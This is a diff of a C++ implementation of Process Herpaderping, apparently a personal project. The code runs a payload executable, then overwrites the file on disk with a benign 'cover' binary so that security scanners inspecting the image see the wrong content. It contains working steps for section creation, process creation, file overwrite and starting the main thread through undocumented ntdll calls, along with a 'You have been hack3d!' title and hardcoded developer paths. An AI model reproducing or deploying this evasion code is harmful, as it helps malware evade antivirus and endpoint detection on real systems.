@@ -1,14 +1,19 @@
 #include "Herpaderping.h"
+
 #include <iostream>
 
 constexpr auto PROCESS_CREATE_FLAGS_INHERIT_HANDLES = 0x00000004;
 constexpr auto TARGET_PROCESS_TITLE = L"You have been hack3d!";
-constexpr auto DEFAULT_WINDOWS_STATION = L"WinSta0\\Default";
 
-Herpaderping::Herpaderping(std::string path_to_source, std::string path_to_target, std::string path_to_cover) :
+Herpaderping::Herpaderping(std::string path_to_source, 
+						   std::string path_to_target, 
+						   std::string path_to_cover,
+						   const char* windows_station_to_run_on) :
+	windows_station_to_run_on(windows_station_to_run_on),
 	section_handle(),
 	target_process(),
 	target_file(),
+	thread_handle(),
 	source_file_payload(),
 	ntdll_functions(std::make_unique<NtdllFunctions>()),
 	path_to_source(path_to_source),
@@ -47,7 +52,6 @@ void Herpaderping::read_source_payload()
 		throw std::runtime_error("GetFileSize: failed to retreive source file size. Error: " + error_to_str(GetLastError()));
 	}
 
-	// TODO: check working!
 	this->source_file_payload = std::make_unique<std::vector<char>>(source_file_size);
 	if (!ReadFile(source_file, source_file_payload.get()->data(), source_file_size, nullptr, nullptr)) {
 		throw std::runtime_error("ReadFile: failed to read source file. Error: " + error_to_str(GetLastError()));
@@ -67,11 +71,10 @@ void Herpaderping::create_target_file_and_write_payload()
 		throw std::runtime_error("CreateFileA: failed to create target file. Error: " + error_to_str(GetLastError()));
 	}
 
-	DWORD a = 0;
 	if (!WriteFile(this->target_file,
 		source_file_payload.get()->data(),
 		source_file_payload.get()->size(),
-		&a,
+		nullptr,
 		nullptr)) {
 		throw std::runtime_error("WriteFile: failed to write source file to target file. Error: " + error_to_str(GetLastError()));
 	}
@@ -79,7 +82,8 @@ void Herpaderping::create_target_file_and_write_payload()
 
 void Herpaderping::create_target_process()
 {
-	NTSTATUS create_section_return_value = (*ntdll_functions).NtCreateSection(&section_handle,
+	// Create a section with this->target_file as its image.
+	NTSTATUS create_section_return_value = ntdll_functions->NtCreateSection(&section_handle,
 		SECTION_ALL_ACCESS,
 		nullptr,
 		nullptr,
@@ -90,6 +94,8 @@ void Herpaderping::create_target_process()
 		throw std::runtime_error("NtCreateSection: failed to create section. Error: " + error_to_str(create_section_return_value));
 	}
 
+	// Create a process with the section created above.
+	// TODO: return value?
 	ntdll_functions->NtCreateProcessEx(&target_process,
 		PROCESS_ALL_ACCESS,
 		nullptr,
@@ -103,6 +109,7 @@ void Herpaderping::create_target_process()
 
 void Herpaderping::cover_target_file()
 {
+	// Open and read target executable file.
 	HANDLE cover_file_handle = CreateFileA(this->path_to_cover.c_str(),
 		GENERIC_READ,
 		0,
@@ -124,10 +131,12 @@ void Herpaderping::cover_target_file()
 		throw std::runtime_error("ReadFile: failed to read cover file. Error: " + error_to_str(GetLastError()));
 	}
 
+	// Seek to the beginning of the target executable.
 	if (INVALID_SET_FILE_POINTER == SetFilePointer(this->target_file, 0, nullptr, FILE_BEGIN)) {
 		throw std::runtime_error("SetFilePointer: failed to set target file pointer. Error: " + error_to_str(GetLastError()));
 	}
 
+	// Overwrite the target executable with the content of the cover executable.
 	if (!WriteFile(this->target_file, cover_file_content.get()->data(), cover_file_size, nullptr, nullptr)) {
 		throw std::runtime_error("WriteFile: failed to overwrite target file. Error: " + error_to_str(GetLastError()));
 	}
@@ -142,8 +151,8 @@ void Herpaderping::create_and_run_target_main_thread()
 	UNICODE_STRING desktop_info;
 	PROCESS_BASIC_INFORMATION current_process_pbi;
 	PEB64 current_process_peb;
-
-	// TODO: check return value
+	
+	// TODO: return value?
 	ntdll_functions->NtQueryInformationProcess(GetCurrentProcess(), 
 		ProcessBasicInformation, 
 		&current_process_pbi,
@@ -152,10 +161,14 @@ void Herpaderping::create_and_run_target_main_thread()
 
 	current_process_peb = *reinterpret_cast<PEB64*>(current_process_pbi.PebBaseAddress);
 
-	ntdll_functions->RtlInitUnicodeString(&image_path_name, L"C:\\Users\\idano\\Workspace\\Projects\\Herpaderping\\x64\\Debug\\target2.exe");
-	ntdll_functions->RtlInitUnicodeString(&command_line, L"\"C:\\Users\\idano\\Workspace\\Projects\\Herpaderping\\x64\\Debug\\target2.exe\"");
+	// Initialize relevant parameters.
+	//ntdll_functions->RtlInitUnicodeString(&image_path_name, string_to_wstring(path_to_target).c_str());
+	//ntdll_functions->RtlInitUnicodeString(&command_line, string_to_wstring("\"" + path_to_target + "\"").c_str());
+	ntdll_functions->RtlInitUnicodeString(&image_path_name, L"C:\\Users\\idano\\Workspace\\Projects\\herpaderping\\Herpaderping\\x64\\Debug\\target.exe");
+	ntdll_functions->RtlInitUnicodeString(&command_line, L"\"C:\\Users\\idano\\Workspace\\Projects\\herpaderping\\Herpaderping\\x64\\Debug\\target.exe\"");
 	ntdll_functions->RtlInitUnicodeString(&title, L"Test");
-	ntdll_functions->RtlInitUnicodeString(&desktop_info, L"WinSta0\\Default");
+	//ntdll_functions->RtlInitUnicodeString(&desktop_info, string_to_wstring(windows_station_to_run_on).c_str());
+	ntdll_functions->RtlInitUnicodeString(&desktop_info, L"WinSta0\\Desktop");
 
 	ntdll_functions->RtlCreateProcessParametersEx(&process_parameters,
 		&image_path_name,
@@ -219,10 +232,11 @@ void Herpaderping::create_and_run_target_main_thread()
 		throw std::runtime_error("ReadProcessMemory: failed to read process memory. Error: " + error_to_str(GetLastError()));
 	}
 
+	// Calculate the absolute address of the entry point.
 	ULONGLONG entry_point = process_peb.ImageBaseAddress + payload_nt_header->OptionalHeader.AddressOfEntryPoint;
 
-	HANDLE thread_handle;
-	ntdll_functions->NtCreateThreadEx(&thread_handle,
+	HANDLE created;
+	ntdll_functions->NtCreateThreadEx(&created,
 		THREAD_ALL_ACCESS,
 		nullptr,
 		this->target_process,
@@ -233,7 +247,8 @@ void Herpaderping::create_and_run_target_main_thread()
 		0,
 		0,
 		nullptr);
-	if (NULL == thread_handle) {
+	if (NULL == created) {
 		throw std::runtime_error("NtCreateThreadEx: failed to create target process' main thread. Error: " + error_to_str(GetLastError()));
 	}
 }
+ 
